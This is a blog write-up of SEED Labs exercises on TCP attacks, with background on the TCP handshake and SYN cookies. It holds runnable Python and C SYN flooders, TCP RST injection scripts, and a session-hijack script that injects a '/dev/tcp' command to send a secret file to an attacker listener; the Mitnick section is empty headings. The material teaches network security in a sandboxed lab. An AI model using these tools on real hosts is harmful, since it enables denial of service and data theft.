---
layout:             post
title:              "SEED Labs 2.0: TCP/IP and Mitnick Attack Labs Writeup"
category:           "Web Applications and Cybersecurity"
tags:               networking cybersecurity syn-flood tcp container
permalink:          /posts/seedlabs/attacks-on-tcp
last_modified_at:   "2023-03-11"
---

For general overview and the setup packages for these two labs, please go to [SEED Labs official website](https://seedsecuritylabs.org/Labs_20.04/Networking/). The lab assignments were conducted using Docker Compose on an AWS EC2 instance running the SEED Ubuntu 20.04 VM. For each lab, download the `Labsetup.zip` file, unzip it, enter the `Labsetup` folder, and use the `docker-compose.yml` file to set up the lab environment.

Let's first take a quick run-through of the Transmission Control Protocol (TCP).

<!-- excerpt-end -->

Establishment of TCP connections is based on a three-way handshake procedure (exchange of three packets) to reserve and announce suitable resources at both ends before data exchange can proceed. A client first sends a SYN packet to the server. The server, in turn, transmits to the client a SYN/ACK packet as an acknowledgement of the reception of the SYN packet. When the client receives the SYN/ACK packet of the server, it sends to the server an ACK packet in acknowledgement.

![tcp-handshake](/assets/images/schematic/tcp-handshake.svg){:class="img-responsive" width="85%"}
<p style="text-align:center;color:gray;font-size:80%;">
Source: <span><a href="https://hpbn.co/building-blocks-of-tcp/">Ilya Grigorik, <i>High Performance Browser Networking</i>, O'Reilly Media, Inc., 2013.</a></span>
</p>

The fundamental unit of data transfer in TCP is a byte. However, TCP implementations generally work with a larger logical unit size called a *segment* when transmitting packets across an IP internetwork. The *Maximum Segment Size (MSS)* is a tunable parameter for a TCP transfer. The choice of the MSS typically depends on the *Maximum Transmission Unit (MTU)* size supported by the underlying network layer. In most instances, each TCP segment is carried in one IP packet.

The task of TCP is to divide the application-layer data into one or more segments, transmit them across the network, and deliver them reliably (and in order) to the receiving TCP. Each segment carries an explicit sequence number, for the purposes of ordering and reliability. During TCP handshake, the two endpoints establish the starting sequence numbers for data transfers in each direction, set connection parameters (e.g., MSS), and negotiate desired options (e.g., timestamps, SACK, or the window scale option for high bandwidth-delay product networks).

## Table of Contents
{:.no_toc}
* TOC 
{:toc}

## Linux Network Architecture

A bigger picture could be helpful here. As summarized in [this Cloudlfare's blog post](https://blog.cloudflare.com/how-we-built-spectrum/), commonly, there are two distinct layers in the inbound packet path:
- IP firewall: It is usually a stateless piece of software (let us ignore `conntrack` and IP fragment reassembly for now). The firewall analyzes IP packets and decides whether to `ACCEPT` or `DROP` them.
- Network stack: Its main task is to dispatch inbound IP packets into sockets, which are then handled by userspace applications.

The network stack manages abstractions which are shared with userspace. It reassembles TCP flows, deals with routing, and knows which IP addresses are local. Any operating system that supports networking has some type of network stack.

Linux network architecture is such a complex system, as one can see in [this diagram](https://openwrt.org/docs/guide-developer/networking/praxis).

<!--
![linux-network-stack](/assets/images/schematic/lns.png){:class="img-responsive" width="85%"}
<p style="text-align:center;color:gray;font-size:80%;">
Source: <span><a href="https://www.usenix.org/conference/srecon22apac/presentation/jiang">Jizhong Jiang and Shane Xie, Alibaba Cloud</a></span>
</p>

[Linux kernel map](https://makelinux.github.io/kernel/map/)
[Data path](https://www.cs.cornell.edu/~ragarwal/pubs/network-stack.pdf)

### Networking Scalability Problem

[Scaling in the Linux Networking Stack](https://www.kernel.org/doc/Documentation/networking/scaling.txt)

[Reduce cache performance](https://lwn.net/Articles/169961/)

[Why we use the Linux kernel's TCP stack](https://blog.cloudflare.com/why-we-use-the-linux-kernels-tcp-stack/)

[Anatomy of a user namespaces vulnerability](https://lwn.net/Articles/543273/)
-->

## TCP Attacks Lab

Lab instructions can be found [here](https://seedsecuritylabs.org/Labs_20.04/Files/TCP_Attacks/TCP_Attacks.pdf). A nice tutorial on packet crafting with Scapy is [here](https://0xbharath.github.io/art-of-packet-crafting-with-scapy/index.html).

### Task 1: SYN Flooding Attack

Synchronize (SYN) flooding attacks are a type of denial-of-service attack which exploits a vulnerability in the TCP handshake in an attempt to make a server unavailable to legitimate traffic by consuming all available server resources. By repeatedly sending initial connection request (SYN) packets, the attacker is able to overwhelm all available ports on a targeted server machine, causing the targeted device to respond to legitimate traffic sluggishly or not at all[^1].

In the TCP handshake, the state in which the server waits for the ACK packet of a client is called *half-open*. In this state, the server has prepared the communication with a client by assigning a buffer for the connection. At a server, the maximum number of remembered connection requests that have not received an acknowledgment from connecting client is controlled by a backlog queue[^2]. Based on the amount of memory available, the maximal number of remembered connection requests is affected by `listen()` syscall's `backlog` argument and set by the operating system kernel:

```console
$ cat /proc/sys/net/ipv4/tcp_max_syn_backlog
128
```

This value can also be retrieved with the following command:

```console
$ sysctl net.ipv4.tcp_max_syn_backlog
net.ipv4.tcp_max_syn_backlog = 128
```

Packets that arrive at the server and exceed its capacity are simply rejected, and the server sends an RST packet to inform the relevant client that the SYN packet was thrown out. A connection that stays too long in a half-open state is timed-out, and an RST packet is sent to the client.

Large SYN backlog queues and random early drops make SYN flooding more expensive but do not actually solve the problem. A countermeasure called "SYN cookies" is enabled by default on Ubuntu:

```console
$ sysctl -a | grep syncookies
...
net.ipv4.tcp_syncookies = 1
...
```

It will kick in if the machine detects that it is under the SYN flooding attack. SYN cookies are particular choices of initial sequence numbers (ISNs) by TCP servers. The differences between the server's ISN and the client's ISN are:
- Top $$5$$ bits: $$t \bmod{32}$$, where $$t$$ is a $$32-bit$$ time counter that increases every $$64$$ seconds;
- Next $$3$$ bits: an encoding of an MSS selected by the server in response to the client's MSS;
- Bottom $$24$$ bits: a server-selected secret function of the client IP address and port number, the server IP address and port number, and $$t$$.

For the Linux's definition of ISN, look at this `union` inside `struct tcp_skb_cb`:

```c
union {
    /* Note : tcp_tw_isn is used in input path only
     *        (isn chosen by tcp_timewait_state_process())
     *
     *        tcp_gso_segs/size are used in write queue only,
     *        cf tcp_skb_pcount()/tcp_skb_mss()
     */
    __u32       tcp_tw_isn;
    struct {
        u16     tcp_gso_segs;
        u16     tcp_gso_size;
    };
};
```

The choice of sequence number in SYN cookies complies with the basic TCP requirement that sequence numbers increase slowly; the server's ISN increases slightly faster than the client's ISN. A server that uses SYN cookies does not have to drop connections when its SYN backlog queue fills up. Instead it sends back a SYN/ACK packet, exactly as if the SYN backlog queue had been larger. (Exceptions: the server must reject TCP options such as large windows, and it must use one of the eight MSS values that it can encode.) When the server receives an ACK packet, it checks that the secret function works for a recent value of $$t$$, and then rebuilds the SYN backlog queue entry from the encoded MSS[^3]. Related Linux source code is pasted below:

```c
// In: /net/ipv4/tcp_input.c
/* If a SYN cookie is required and supported, returns a clamped MSS value to be
 * used for SYN cookie generation.
 */
u16 tcp_get_syncookie_mss(struct request_sock_ops *rsk_ops,
                          const struct tcp_request_sock_ops *af_ops,
                          struct sock *sk, struct tcphdr *th)
{
    struct tcp_sock *tp = tcp_sk(sk);
    u16 mss;

    if (READ_ONCE(sock_net(sk)->ipv4.sysctl_tcp_syncookies) != 2 && !inet_csk_reqsk_queue_is_full(sk))
        return 0;

    if (!tcp_syn_flood_action(sk, rsk_ops->slab_name))
        return 0;

    if (sk_acceptq_is_full(sk)) {
        NET_INC_STATS(sock_net(sk), LINUX_MIB_LISTENOVERFLOWS);
        return 0;
	}

    mss = tcp_parse_mss_option(th, tp->rx_opt.user_mss);
    if (!mss)
        mss = af_ops->mss_clamp;

    return mss;
}
EXPORT_SYMBOL_GPL(tcp_get_syncookie_mss);


int tcp_conn_request(struct request_sock_ops *rsk_ops,
                     const struct tcp_request_sock_ops *af_ops,
                     struct sock *sk, struct sk_buff *skb)
{
    ...
    __u32 isn = TCP_SKB_CB(skb)->tcp_tw_isn;
    ...
    u8 syncookies;

    syncookies = READ_ONCE(net->ipv4.sysctl_tcp_syncookies);

    /* TW buckets are converted to open requests without
     * limitations, they conserve resources and peer is
     * evidently real one.
     */
    if ((syncookies == 2 || inet_csk_reqsk_queue_is_full(sk)) && !isn) {
        want_cookie = tcp_syn_flood_action(sk, rsk_ops->slab_name);
        if (!want_cookie)
            goto drop;
    }

    ...

    if (!want_cookie && !isn) {
        int max_syn_backlog = READ_ONCE(net->ipv4.sysctl_max_syn_backlog);

        /* Kill the following clause, if you dislike this way. */
        if (!syncookies && (max_syn_backlog - inet_csk_reqsk_queue_len(sk) < (max_syn_backlog >> 2)) && !tcp_peer_is_proven(req, dst)) {
            /* Without syncookies last quarter of
             * backlog is filled with destinations,
             * proven to be alive.
             * It means that we continue to communicate
             * to destinations, already remembered
             * to the moment of synflood.
             */
            pr_drop_req(req, ntohs(tcp_hdr(skb)->source), rsk_ops->family);
            goto drop_and_release;
        }

        isn = af_ops->init_seq(skb);
    }

    ...
}
```

The following lines inside this Lab's `docker-compose.yml` file:

```yaml
sysctls:
    - net.ipv4.tcp_syncookies=0
```

disable the SYN cookies countermeasure for the victim Docker container. Also pay attention to this line:

```yaml
privileged: true
```

The victim Docker container is thereby given the privilege to use `sysctl` to change the values of system variables.

#### Task 1.1: Launch the Attack Using Python

Inside the victim's shell, we can issue the `netstat` command to determine the destination port (`dport`) to which our SYN packets will be sent:

```console
[March 08 2023] seed@xingjian:~/Documents/TCPAttack$ docker-compose ps
     Name                    Command               State   Ports
----------------------------------------------------------------
seed-attacker     /bin/sh -c /bin/bash             Up           
user1-10.9.0.6    bash -c  /etc/init.d/openb ...   Up           
user2-10.9.0.7    bash -c  /etc/init.d/openb ...   Up           
victim-10.9.0.5   bash -c  /etc/init.d/openb ...   Up
[March 08 2023] seed@xingjian:~/Documents/TCPAttack$ docksh victim-10.9.0.5
root@5eec56c1372f:/# netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.11:38561        0.0.0.0:*               LISTEN     
root@5eec56c1372f:/# exit
exit
```

```python
#!/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

ip  = IP(dst="10.9.0.5")                                # victim's IPv4 address
tcp = TCP(dport=23, flags='S')
pkt = ip/tcp

while True:
    pkt[IP].src     = str(IPv4Address(getrandbits(32))) # source IP
    pkt[TCP].sport  = getrandbits(16)                   # source port
    pkt[TCP].seq    = getrandbits(32)                   # sequence number
    send(pkt, verbose=0)
```

The above Python program sends out spoofed TCP SYN packets, with randomly generated source IP address, source port, and sequence number. Run this program for at least one minute and then try to `telnet` into the victim machine:

```console
$ docker exec -it seed-attacker /bin/bash
root@ip-172-31-1-54:/# cd volumes
root@ip-172-31-1-54:/volumes# touch synflood.py
root@ip-172-31-1-54:/volumes# nano synflood.py
root@ip-172-31-1-54:/volumes# python3 synflood.py &
[1] 22
root@ip-172-31-1-54:/volumes# telnet 10.9.0.5
# telnet 10.9.0.5
Trying 10.9.0.5...
Connected to 10.9.0.5.
Escape character is '^]'.
Ubuntu 20.04.1 LTS
d19b63619cad login:
```

After a while, our attack successfully broke into the victim's machine.

#### Task 1.2: Launch the Attack Using C

Actually, it is more likely that our attack using the Python program would fail. Multiple issues could contribute to the failure of the attack. Other than the TCP cache issue, all the issues mentioned in the [lab instructions](https://seedsecuritylabs.org/Labs_20.04/Files/TCP_Attacks/TCP_Attacks.pdf) for Task 1.1 can be resolved if we can send spoofed SYN packets fast enough. We can certainly achieve that using the following C program:

```c
/* synflood.c */
/* Compile with: gcc -o synflood synflood.c */
/* Run with: ./synflood 10.9.0.5 23 */
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <time.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

/* IP Header */
struct ipheader
{
    unsigned char      iph_ihl : 4,     // IP header length
                       iph_ver : 4;     // IP version
    unsigned char      iph_tos;         // Type of service
    unsigned short int iph_len;         // IP Packet length (data + header)
    unsigned short int iph_ident;       // Identification
    unsigned short int iph_flag : 3,    // Fragmentation flags
                       iph_offset : 13; // Flags offset
    unsigned char      iph_ttl;         // Time to Live
    unsigned char      iph_protocol;    // Protocol type
    unsigned short int iph_chksum;      // IP datagram checksum
    struct in_addr     iph_sourceip;    // Source IP address
    struct in_addr     iph_destip;      // Destination IP address
};

/* TCP Header */
struct tcpheader
{
    u_short tcp_sport;  /* source port */
    u_short tcp_dport;  /* destination port */
    u_int   tcp_seq;    /* sequence number */
    u_int   tcp_ack;    /* acknowledgement number */
    u_char  tcp_offx2;  /* data offset, rsvd */
#define TH_OFF(th) (((th)->tcp_offx2 & 0xf0) >> 4)
    u_char tcp_flags;
#define TH_FIN  0x01
#define TH_SYN  0x02
#define TH_RST  0x04
#define TH_PUSH 0x08
#define TH_ACK  0x10
#define TH_URG  0x20
#define TH_ECE  0x40
#define TH_CWR  0x80
#define TH_FLAGS (TH_FIN | TH_SYN | TH_RST | TH_ACK | TH_URG | TH_ECE | TH_CWR)
    u_short tcp_win; /* window */
    u_short tcp_sum; /* checksum */
    u_short tcp_urp; /* urgent pointer */
};

/* Psuedo TCP header */
struct pseudo_tcp
{
    unsigned            saddr, daddr;
    unsigned char       mbz;
    unsigned char       ptcl;
    unsigned short      tcpl;
    struct tcpheader    tcp;
    char                payload[1500];
};

// #define DEST_IP    "10.9.0.5"
// #define DEST_PORT  23            // Attack the web server
#define PACKET_LEN 1500

unsigned short calculate_tcp_checksum(struct ipheader *ip);

/*************************************************************
  Given an IP packet, send it out using a raw socket.
**************************************************************/
void send_raw_ip_packet(struct ipheader *ip)
{
    struct sockaddr_in dest_info;
    int enable = 1;

    // Step 1: Create a raw network socket.
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0)
    {
        fprintf(stderr, "socket() failed: %s\n", strerror(errno));
        exit(1);
    }

    // Step 2: Set socket option.
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
               &enable, sizeof(enable));

    // Step 3: Provide needed information about destination.
    dest_info.sin_family = AF_INET;
    dest_info.sin_addr = ip->iph_destip;

    // Step 4: Send the packet out.
    sendto(sock, ip, ntohs(ip->iph_len), 0,
           (struct sockaddr *)&dest_info, sizeof(dest_info));
    close(sock);
}

/******************************************************************
  Spoof a TCP SYN packet.
*******************************************************************/
int main(int argc, char *argv[])
{
    char buffer[PACKET_LEN];
    struct ipheader *ip = (struct ipheader *)buffer;
    struct tcpheader *tcp = (struct tcpheader *)(buffer +
                                                 sizeof(struct ipheader));

    if (argc < 3)
    {
        printf("Please provide IP and Port number\n");
        printf("Usage: synflood ip port\n");
        exit(1);
    }

    char *DEST_IP = argv[1];
    int DEST_PORT = atoi(argv[2]);

    srand(time(0)); // Initialize the seed for random # generation.
    while (1)
    {
        memset(buffer, 0, PACKET_LEN);
        /*********************************************************
           Step 1: Fill in the TCP header.
        ********************************************************/
        tcp->tcp_sport  = rand();           // Use random source port
        tcp->tcp_dport  = htons(DEST_PORT);
        tcp->tcp_seq    = rand();           // Use random sequence #
        tcp->tcp_offx2  = 0x50;
        tcp->tcp_flags  = TH_SYN;           // Enable the SYN bit
        tcp->tcp_win    = htons(20000);
        tcp->tcp_sum    = 0;

        /*********************************************************
           Step 2: Fill in the IP header.
        ********************************************************/
        ip->iph_ver = 4;                    // Version (IPV4)
        ip->iph_ihl = 5;                    // Header length
        ip->iph_ttl = 50;                   // Time to live
        ip->iph_sourceip.s_addr = rand();   // Use a random IP address
        ip->iph_destip.s_addr = inet_addr(DEST_IP);
        ip->iph_protocol = IPPROTO_TCP;     // The value is 6.
        ip->iph_len = htons(sizeof(struct ipheader) +
                            sizeof(struct tcpheader));

        // Calculate tcp checksum
        tcp->tcp_sum = calculate_tcp_checksum(ip);

        /*********************************************************
          Step 3: Finally, send the spoofed packet
        ********************************************************/
        send_raw_ip_packet(ip);
    }

    return 0;
}

unsigned short in_cksum(unsigned short *buf, int length)
{
    unsigned short *w = buf;
    int nleft = length;
    int sum = 0;
    unsigned short temp = 0;

    /*
     * The algorithm uses a 32 bit accumulator (sum), adds
     * sequential 16 bit words to it, and at the end, folds back all
     * the carry bits from the top 16 bits into the lower 16 bits.
     */
    while (nleft > 1)
    {
        sum += *w++;
        nleft -= 2;
    }

    /* treat the odd byte at the end, if any */
    if (nleft == 1)
    {
        *(u_char *)(&temp) = *(u_char *)w;
        sum += temp;
    }

    /* add back carry outs from top 16 bits to low 16 bits */
    sum = (sum >> 16) + (sum & 0xffff); // add hi 16 to low 16
    sum += (sum >> 16);                 // add carry
    return (unsigned short)(~sum);
}

/****************************************************************
  TCP checksum is calculated on the pseudo header, which includes
  the TCP header and data, plus some part of the IP header.
  Therefore, we need to construct the pseudo header first.
*****************************************************************/

unsigned short calculate_tcp_checksum(struct ipheader *ip)
{
    struct tcpheader *tcp = (struct tcpheader *)((u_char *)ip +
                             sizeof(struct ipheader));

    int tcp_len = ntohs(ip->iph_len) - sizeof(struct ipheader);

    /* pseudo tcp header for the checksum computation */
    struct pseudo_tcp p_tcp;
    memset(&p_tcp, 0x0, sizeof(struct pseudo_tcp));

    p_tcp.saddr = ip->iph_sourceip.s_addr;
    p_tcp.daddr = ip->iph_destip.s_addr;
    p_tcp.mbz   = 0;
    p_tcp.ptcl  = IPPROTO_TCP;
    p_tcp.tcpl  = htons(tcp_len);
    memcpy(&p_tcp.tcp, tcp, tcp_len);

    return (unsigned short)in_cksum((unsigned short *)&p_tcp,
                                    tcp_len + 12);
}
```

Compile this program on the SEED VM and then run it on our `seed-attacker` Docker container. After a relatively short period of time, our attack should succeed.

### Task 2: TCP RST Attacks on `telnet` Connections

In this task, we need to launch a TCP reset (RST) attack from the VM to break an existing `telnet` connection between $$A$$ and $$B$$, which are two running containers. To simplify the lab, we assume that the attacker and the victim are on the same LAN, i.e., the attacker can observe the TCP traffic between $$A$$ and $$B$$.

The reset (RST) bit in the TCP packet header is used to signal error conditions detected by TCP. A TCP RST packet is used by a TCP sender to indicate that it will neither accept nor receive more data. Scenarios where a TCP RST packet must be sent include the arrival of a data packet for which no connection is open, the arrival of a TCP segment with an inappropriate sequence number, or the arrival of a SYN/ACK packet for which no SYN had been initiated.

A TCP RST attack is executed using a single packet of data, no more than a few bytes in size. A spoofed TCP segment, crafted and sent by an attacker, tricks two victims into abandoning a TCP connection, interrupting possibly vital communications between them. The attack is believed to be a key component of China's Great Firewall, used by the Chinese government to censor the internet inside China.

First, let's enter into the shell of the `user1-10.9.0.6` container and issue the command `ifconfig`. Find the network interface with the IP address `10.9.0.1` (in my case: `br-f00d665d871a`). Then, open a new terminal window, and issue the following command (type `sudo apt install tshark` if `tshark` is not installed):

```console
$ tshark -i br-f00d665d871a -f "tcp port 23"
Capturing on 'br-f00d665d871a'
```

Next, inside our `user1-10.9.0.6`'s shell, type:

```bash
telnet 10.9.0.5
```

Immediately, we should see quite a lot of messages generated by `tshark`:

```console
    1 0.000000000     10.9.0.6 → 10.9.0.5     TCP 74 43106 → 23 [SYN] Seq=2451321324 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=3440862779 TSecr=0 WS=128
    2 0.000037253     10.9.0.5 → 10.9.0.6     TCP 74 23 → 43106 [SYN, ACK] Seq=3957983967 Ack=2451321325 Win=65160 Len=0 MSS=1460 SACK_PERM=1 TSval=3679831282 TSecr=3440862779 WS=128
    3 0.000135405     10.9.0.6 → 10.9.0.5     TCP 66 43106 → 23 [ACK] Seq=2451321325 Ack=3957983968 Win=64256 Len=0 TSval=3440862779 TSecr=3679831282
    4 0.000447651     10.9.0.6 → 10.9.0.5     TELNET 90 Telnet Data ...
    5 0.000466372     10.9.0.5 → 10.9.0.6     TCP 66 23 → 43106 [ACK] Seq=3957983968 Ack=2451321349 Win=65152 Len=0 TSval=3679831283 TSecr=3440862780
    6 0.003501655     10.9.0.5 → 10.9.0.6     TELNET 78 Telnet Data ...
    7 0.003517745     10.9.0.6 → 10.9.0.5     TCP 66 43106 → 23 [ACK] Seq=2451321349 Ack=3957983980 Win=64256 Len=0 TSval=3440862783 TSecr=3679831286
...
  106 16.612310492     10.9.0.5 → 10.9.0.6     TELNET 87 Telnet Data ...
  107 16.612329722     10.9.0.6 → 10.9.0.5     TCP 66 43106 → 23 [ACK] Seq=2451321427 Ack=3957985002 Win=64128 Len=0 TSval=3440879392 TSecr=3679847895
```

Therefore we have all the information we need to write the following `reset.py` program:

```python
#!/usr/bin/env python3

# reset.py
from scapy.all import *

ip  = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=43106, dport=23, flags="R", seq=2451321325)
pkt = ip/tcp
ls(pkt)
send(pkt, iface="br-f00d665d871a", verbose=0)
```

Run the program with `sudo`. We shall subsequently see the following message printed out by `tshark`:

```console
$ tshark -i br-f00d665d871a -f "tcp port 23"
Capturing on 'br-f00d665d871a'
    1 0.000000000     10.9.0.6 → 10.9.0.5     TCP 54 43106 → 23 [RST] Seq=2451321325 Win=8192 Len=0
```

The `reset_auto.py` program shown below launch the attack automatically using the sniffing-and-spoofing technique:

```python
#!/usr/bin/env python3

# reset_auto.py
from scapy.all import *

def spoof_tcp(pkt):
    ip      = IP(dst=pkt[IP].src, src=pkt[IP].dst)
    tcp     = TCP(dport=pkt[TCP].sport, sport=pkt[TCP].dport, flags="R", seq=pkt[TCP].ack)
    spoofed = ip/tcp
    ls(spoofed)
    send(spoofed, verbose=0)

pkt=sniff(iface='br-f00d665d871a', filter='tcp and port 23', prn=spoof_tcp)
```

### Task 3: TCP Session Hijacking

According to MDN Web Docs, the TCP session hijacking attack takes five steps:
1. **Sniff**, that is perform a man-in-the-middle (MITM) attack, place the attacker between victim and server.
2. **Monitor** packets flowing between server and user.
3. **Break** the victim machine's connection.
4. **Take control** of the session.
5. **Inject** new packets to the server using the victim's session ID.

In this task, we need to demonstrate how we can hijack a `telnet` session between two computers. Our goal is to get the `telnet` server to run a malicious command from us. For the simplicity of the task, we assume that the attacker and the victim are on the same LAN.

First, let's use `tshark` to capture packets between user 1 (`user1-10.9.0.6`) and the victim. In another terminal window, enter into the user 1's shell and `telnet` the victim's IP address. After logging in, issue the `netstat` command:

```console
seed@5eec56c1372f:~$ netstat -nta
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.11:38561        0.0.0.0:*               LISTEN     
tcp        0      0 10.9.0.5:23             10.9.0.6:48662          ESTABLISHED
```

At the same time, we can see `tshark` printing out multiple lines of packet information:

```console
...
  116 235.910256731     10.9.0.6 → 10.9.0.5     TELNET 67 Telnet Data ...
  117 235.910386009     10.9.0.5 → 10.9.0.6     TELNET 67 Telnet Data ...
  118 235.910402316     10.9.0.6 → 10.9.0.5     TCP 66 48662 → 23 [ACK] Seq=1340333909 Ack=3134172352 Win=64128 Len=0 TSval=1776749336 TSecr=3880557648
  119 236.150400115     10.9.0.6 → 10.9.0.5     TELNET 67 Telnet Data ...
  120 236.150552808     10.9.0.5 → 10.9.0.6     TELNET 67 Telnet Data ...
  121 236.150570702     10.9.0.6 → 10.9.0.5     TCP 66 48662 → 23 [ACK] Seq=1340333910 Ack=3134172353 Win=64128 Len=0 TSval=1776749576 TSecr=3880557888
  122 236.415307544     10.9.0.6 → 10.9.0.5     TELNET 67 Telnet Data ...
  123 236.415428473     10.9.0.5 → 10.9.0.6     TELNET 67 Telnet Data ...
  124 236.415442987     10.9.0.6 → 10.9.0.5     TCP 66 48662 → 23 [ACK] Seq=1340333911 Ack=3134172354 Win=64128 Len=0 TSval=1776749841 TSecr=3880558153
  125 236.608509387     10.9.0.6 → 10.9.0.5     TELNET 67 Telnet Data ...
  126 236.608633947     10.9.0.5 → 10.9.0.6     TELNET 67 Telnet Data ...
  127 236.608646896     10.9.0.6 → 10.9.0.5     TCP 66 48662 → 23 [ACK] Seq=1340333912 Ack=3134172355 Win=64128 Len=0 TSval=1776750034 TSecr=3880558346
  128 236.695322363     10.9.0.6 → 10.9.0.5     TELNET 67 Telnet Data ...
  129 236.695454590     10.9.0.5 → 10.9.0.6     TELNET 67 Telnet Data ...
  130 236.695483888     10.9.0.6 → 10.9.0.5     TCP 66 48662 → 23 [ACK] Seq=1340333913 Ack=3134172356 Win=64128 Len=0 TSval=1776750121 TSecr=3880558433
  131 236.889633744     10.9.0.6 → 10.9.0.5     TELNET 68 Telnet Data ...
  132 236.891735810     10.9.0.5 → 10.9.0.6     TELNET 468 Telnet Data ...
  133 236.891764815     10.9.0.6 → 10.9.0.5     TCP 66 48662 → 23 [ACK] Seq=1340333915 Ack=3134172758 Win=64128 Len=0 TSval=1776750318 TSecr=3880558630
```

Don't forget to use `ifconfig` or `ip addr` to find the network interface associated with the IP address `10.9.0.1` and use Wireshark to find the next sequence and acknowledgement numbers.

```python
#!/usr/bin/env python3

# hijack.py
from scapy.all import *

ip   = IP(src="10.9.0.6", dst="10.9.0.5")
tcp  = TCP(sport=48662, dport=23, flags="A", seq=1340333916, ack=3134172759)
data = "\r cat secret > /dev/tcp/10.9.0.1/9090 \r"
pkt  = ip/tcp/data
ls(pkt)
send(pkt, iface="br-16dcc04ec32d", verbose=0)
```

We can also launch the attack automatically as in the previous task.

## The Mitnick Attack Lab

Lab instructions can be found [here](https://seedsecuritylabs.org/Labs_20.04/Files/Mitnick_Attack/Mitnick_Attack.pdf). The Mitnick attack is a special case of TCP session hijacking attacks. Instead of hijacking an existing TCP connection between victims $$A$$ and $$B$$, the Mitnick attack creates a TCP connection between $$A$$ and $$B$$ first on their behalf, and then naturally hijacks the connection.

### Task 1: Simulated SYN Flooding

### Task 2: Spoof TCP Connections and `rsh` Sessions

#### Task 2.1: Spoof the First TCP Connection

#### Task 2.2: Spoof the Second TCP Connection

### Task 3: Set Up a Backdoor

## Notes

[^1]: [https://www.cloudflare.com/learning/ddos/syn-flood-ddos-attack/](https://www.cloudflare.com/learning/ddos/syn-flood-ddos-attack/).

[^2]: This SYN backlog queue is also called "request socket queue." There is another backlog queue, maintained by the Linux kernel, called the accept queue. Once an ACK packet is received and validated, a new client connection is ready. This connection is moved into the accept queue, waiting for the application to call `accept()` and receive it. The `net.core.somaxconn` toggle specifies a network-system-wide maximum for the backlog of any socket; that is, it is not system global, but global to a Linux network namespace. Running in containers that have their own network namespaces, the value of `net.core.somaxconn` is set to the built-in kernel default. (More specifically, according to [the official documentation of Docker](https://docs.docker.com/engine/security/), all containers on a given Docker host are sitting on bridge interfaces, each of which gets its own network stack, meaning that a container does not get privileged access to the sockets or interfaces of another container.) When a larger backlog value is provided, the kernel silently caps it at the value of `net.core.somaxconn`. On our SEED VM, this value is `4096`. This [post](https://blog.cloudflare.com/syn-packet-handling-in-the-wild/) from Cloudflare and this [post](https://theojulienne.io/2020/07/03/scaling-linux-services-before-accepting-connections.html) from Theo Julienne are very useful.

[^3]: [https://cr.yp.to/syncookies.html](https://cr.yp.to/syncookies.html).